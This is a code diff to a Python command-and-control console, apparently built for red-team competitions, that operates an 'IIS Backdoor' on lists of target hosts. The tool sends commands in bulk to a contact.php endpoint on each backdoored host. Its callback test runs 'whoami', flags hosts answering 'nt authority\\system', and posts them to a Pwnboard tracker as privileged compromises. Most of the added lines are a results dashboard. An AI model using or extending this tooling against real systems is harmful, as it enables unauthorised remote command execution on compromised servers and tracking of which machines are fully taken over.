@@ -4,6 +4,8 @@ import json
 import subprocess
 import threading
 import socket
+import re
+import urllib3
 from pyfiglet import Figlet
 from rich.console import Console
 from rich.text import Text
@@ -16,13 +18,13 @@ from InquirerPy import inquirer
 from InquirerPy.base.control import Choice
 from InquirerPy.utils import get_style
 
+# Disable HTTPS Warnings for Pwnboard
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 ALL_HOSTS = [
     # List Teams Here
 
     # Custom IPs
-    "192.168.1.2",
-    "192.168.1.3",
-    "192.168.1.6",
 ]
 
 ALL_DC = [
@@ -49,7 +51,14 @@ PORT = 8080
 TIMEOUT = 30
 CONCURRENCY = 8
 THROTTLE_MS = 50
-PWNBOARD_URL = "https://www.pwnboard.win/creds"
+PWNBOARD_URL = "https://www.pwnboard.win/pwn"
+AUTH_TOKEN = "Bearer YOUR_PWNBOARD_AUTH_TOKEN_HERE"  # Replace with your actual token
+
+# Callback Global Variables
+unprivileged_results = []
+privileged_results = []
+failed_results = []
+error_results = []
 
 console = Console() # For ASCII Art
 
@@ -193,33 +202,44 @@ def select_local_ip():
     
     return selected_ip
 
-def fwd_pwnboard(target, response):
-    print("\nForwarding valid callback to Pwnboard...")
-    print(target)
-    print(response)
-    return
+def fwd_pwnboard(target, result):
+    #print("\nForwarding valid callback to Pwnboard...") testing
+    #print(target)
 
     # Set up JSON Request
     data = {}
     data["ip"] = target
-    data["service"] = "Mirage"
-    data["message"] = "Valid Callback Found"
+    data["application"] = "Mirage"
+    data["access_type"] = "IIS Backdoor"
 
     payload = json.dumps(data)
     # print(payload)
 
-    headers = {'Content-Type': 'application/json'}
+    headers = {'Content-Type': 'application/json', 'Authorization': AUTH_TOKEN}
 
     # Send and check result
     try:
-        result = requests.post(PWNBOARD_URL, headers=headers, data=payload, verify=False)
-        result.raise_for_status()
+        response = requests.post(PWNBOARD_URL, headers=headers, data=payload, verify=False)
+        #print(f"✅ Payload delivered successfully, code {response.status_code}.") testing
+        privileged_results.append({
+            "target": target,
+            "status": "PRIVILEGED - Sent to Pwnboard",
+            "pwnboard_status": f"HTTP {response.status_code}"
+        })
     except requests.exceptions.HTTPError as err:
-        print(err)
+        #print(f"❌ HTTP Error: {err}") testing
+        privileged_results.append({
+            "target": target, 
+            "status": "PRIVILEGED - Pwnboard Error",
+            "pwnboard_status": f"Error: {err}"
+        })
     except requests.exceptions.MissingSchema as nourl:
-        print("No Pwnboard_URL provided : Skipping Webhook")
-    else:
-        print("Payload delivered successfully, code {}.".format(result.status_code))
+        #print(f"❌ PWNBoard Error: {nourl}") testing
+        privileged_results.append({
+            "target": target,
+            "status": "PRIVILEGED - Pwnboard Error", 
+            "pwnboard_status": f"Error: {nourl}"
+        })
 
 def send_command(client, port, command, callback=False):
     contact_url = f"http://{client}:{port}/contact.php"
@@ -278,6 +298,7 @@ def main_interface():
             Choice(value="UTILIITY", name="Spawn Utility Backdoors (Coming Soon)"),
             Choice(value="SSH", name="Drop SSH Keys (Coming Soon)"),
             Choice(value="CALLBACK", name="Test Connections"),
+            Choice(value="VIEW_CALLBACKS", name="View All Connections"),
             Choice(value=None, name="Exit"),
         ],
         default="SINGULAR",
@@ -422,13 +443,210 @@ def run_threads(clients, port, command, action_type="command", attacker_ip=None,
     
     # Send successful callbacks data to fwd_pwnboard
     if callback:
-        successful_results = [r for r in results if r["color"] == "#00ff00"]
-        console.print(f"\n[bold #00ff00]Forwarding {len(successful_results)} successful results to pwnboard...[/bold #00ff00]")
-        for result in successful_results:
-            fwd_pwnboard(result["target"], result["response"])
+        # Reset global lists
+        privileged_results.clear()
+        unprivileged_results.clear()
+        failed_results.clear()
+        error_results.clear()
 
-    # Display results in a beautiful way
-    display_results(results, action_type)
+        # Process new callback results
+        successful_results = [r for r in results if r["color"] == "#00ff00"]
+        for result in successful_results:
+            response_text = str(result["response"])
+            match = re.search(r"nt authority\\system", response_text, re.IGNORECASE)
+            if match:
+                fwd_pwnboard(result["target"], result)
+            else:
+                unprivileged_results.append(result)
+        console.print(f"[bold #00ff00]Forwarded {len(privileged_results)} privileged callbacks to Pwnboard.[/bold #00ff00]")
+
+        failed_results.extend([r for r in results if r["color"] == "#ff0000"])
+        error_results.extend([r for r in results if r["color"] == "#ffff00"])
+    else:
+        # Display results in an appealing way
+        display_results(results, action_type)
+
+def display_callbacks():
+    console.print("\n")
+    
+    # Calculate statistics
+    total_all = len(privileged_results) + len(unprivileged_results) + len(failed_results) + len(error_results)
+    success_rate = len(privileged_results) / total_all * 100 if total_all > 0 else 0.0
+    
+    header_text = Text()
+    header_text.append(f"Total Results: {total_all}", style="bold white")
+
+    # Main header with statistics
+    console.print(Panel(
+        header_text,
+        title="[bold #00ff00]📊 CALLBACK RESULTS SUMMARY[/bold #00ff00]",
+        border_style="#00ff00",
+        padding=(1, 2),
+        expand=False
+    ))
+    console.print()
+    
+    # Create detailed sections for each result type
+    terminal_width = console.size.width
+    
+    # PRIVILEGED RESULTS
+    if privileged_results:
+        priv_header = Text()
+        priv_header.append("🟢 ", style="#00ff00")
+        priv_header.append(f"PRIVILEGED RESULTS", style="bold #00ff00")
+        priv_header.append(f" ({len(privileged_results)})", style="#00ff00")
+        
+        console.print(Panel(priv_header, border_style="#00ff00", padding=(0, 1)))
+        
+        priv_table = Table(show_header=True, header_style="bold #00ff00", border_style="#00ff00")
+        priv_table.add_column("Target IP", style="white", width=20)
+        priv_table.add_column("Status", style="white", min_width=30)
+        priv_table.add_column("Details", style="white", min_width=60)
+        
+        for result in privileged_results:
+            target = result.get('target', 'Unknown')
+            status = result.get('status', 'No details')
+            pwnboard_status = result.get('pwnboard_status', 'Pending')
+            details = f"Pwnboard: {pwnboard_status}"
+            priv_table.add_row(target, status, details)
+        
+        console.print(priv_table)
+        console.print()
+    else:
+        console.print(Panel(
+            Text("No privileged results", style="dim #00ff00"),
+            border_style="#00ff00",
+            padding=(1, 2),
+            expand=False
+        ))
+        console.print()
+    
+    # UNPRIVILEGED RESULTS
+    if unprivileged_results:
+        unpriv_header = Text()
+        unpriv_header.append("🔵 ", style="#3498db")
+        unpriv_header.append(f"UNPRIVILEGED RESULTS", style="bold #3498db")
+        unpriv_header.append(f" ({len(unprivileged_results)})", style="#3498db")
+
+        console.print(Panel(unpriv_header, border_style="#3498db", padding=(0, 1)))
+
+        unpriv_table = Table(show_header=True, header_style="bold #3498db", border_style="#3498db")
+        unpriv_table.add_column("Target IP", style="white", width=20)
+        unpriv_table.add_column("Status", style="white", min_width=30)
+        unpriv_table.add_column("Details", style="white", min_width=60)
+
+        for result in unprivileged_results:
+            target = result.get('target', 'Unknown')
+            status = result.get('status', 'User-only')
+            details = "User privileges only — system access not present"
+            unpriv_table.add_row(target, status, details)
+
+        console.print(unpriv_table)
+        console.print()
+    else:
+        console.print(Panel(
+            Text("No unprivileged results", style="dim #5dade2"),
+            border_style="#3498db",
+            padding=(1, 2),
+            expand=False,
+        ))
+        console.print()
+    
+    # WARNING/ERROR RESULTS (appear before failures)
+    if error_results:
+        err_header = Text()
+        err_header.append("🟡 ", style="#ffff00")
+        err_header.append(f"WARNING/ERROR RESULTS", style="bold #ffff00")
+        err_header.append(f" ({len(error_results)})", style="#ffff00")
+        
+        console.print(Panel(err_header, border_style="#ffff00", padding=(0, 1)))
+        
+        err_table = Table(show_header=True, header_style="bold #ffff00", border_style="#ffff00")
+        err_table.add_column("Target IP", style="white", width=20)
+        err_table.add_column("Status", style="white", min_width=30)
+        err_table.add_column("Details", style="white", min_width=60)
+        
+        for result in error_results:
+            target = result.get('target', 'Unknown')
+            status = result.get('status', 'Warning')
+            # Extract meaningful error message
+            response = str(result.get('response', ''))
+            if 'exception' in status.lower():
+                details = "Execution error - Check logs for details"
+            elif response:
+                details = response[:50] if len(response) > 50 else response
+            else:
+                details = "Unknown warning condition"
+            err_table.add_row(target, status, details)
+        
+        console.print(err_table)
+        console.print()
+    else:
+        console.print(Panel(
+            Text("No warning/error results", style="dim #ffff00"),
+            border_style="#ffff00",
+            padding=(1, 2),
+            expand=False
+        ))
+        console.print()
+    
+    # FAILED RESULTS
+    if failed_results:
+        fail_header = Text()
+        fail_header.append("🔴 ", style="#ff0000")
+        fail_header.append(f"FAILED RESULTS", style="bold #ff0000")
+        fail_header.append(f" ({len(failed_results)})", style="#ff0000")
+        
+        console.print(Panel(fail_header, border_style="#ff0000", padding=(0, 1)))
+        
+        fail_table = Table(show_header=True, header_style="bold #ff0000", border_style="#ff0000")
+        fail_table.add_column("Target IP", style="white", width=20)
+        fail_table.add_column("Status", style="white", min_width=30)
+        fail_table.add_column("Details", style="white", min_width=60)
+        
+        for result in failed_results:
+            target = result.get('target', 'Unknown')
+            status = result.get('status', 'Failed')
+            # Extract meaningful error from response
+            response = str(result.get('response', ''))
+            if 'timed out' in response.lower():
+                details = "Connection timeout - Target unreachable"
+            elif 'connection' in response.lower():
+                details = "Connection failed - Check target IP/port"
+            else:
+                details = response[:50] if response else "Unknown failure"
+            fail_table.add_row(target, status, details)
+        
+        console.print(fail_table)
+        console.print()
+    else:
+        console.print(Panel(
+            Text("No failed results", style="dim #ff0000"),
+            border_style="#ff0000",
+            padding=(1, 2),
+            expand=False
+        ))
+        console.print()
+    
+    # Final Summary Dashboard (compact)
+    console.print("=" * min(terminal_width - 2, 100), "\n")
+
+    summary_text = Text()
+    summary_text.append(f"🟢 {len(privileged_results)}  ", style="bold #00ff00")
+    summary_text.append(f"🔵 {len(unprivileged_results)}  ", style="bold #3498db")
+    summary_text.append(f"🟡 {len(error_results)}  ", style="bold #ffff00")
+    summary_text.append(f"🔴 {len(failed_results)}\n\n", style="bold #ff0000")
+    summary_text.append(f"📋 TOTAL RESULTS: {total_all}\n", style="bold white")
+    summary_text.append(f"📈 SUCCESS RATE: {success_rate:.2f}%", style="bold white")
+
+    console.print(Panel(
+        summary_text,
+        title="[bold #00ff00]📊 FINAL STATISTICS[/bold #00ff00]",
+        border_style="#00ff00",
+        padding=(1, 2),
+        width=50,
+        expand=False
+    ))
 
 def display_results(results, action_type):
     """Display results in a visually appealing format"""
@@ -895,6 +1113,8 @@ def main():
         elif action == "CALLBACK":
             command = "whoami"
             mass_execution(command, callback=True)
+        elif action == "VIEW_CALLBACKS":
+            display_callbacks()
         else:
             print("Unknown action, returning to menu.")
         
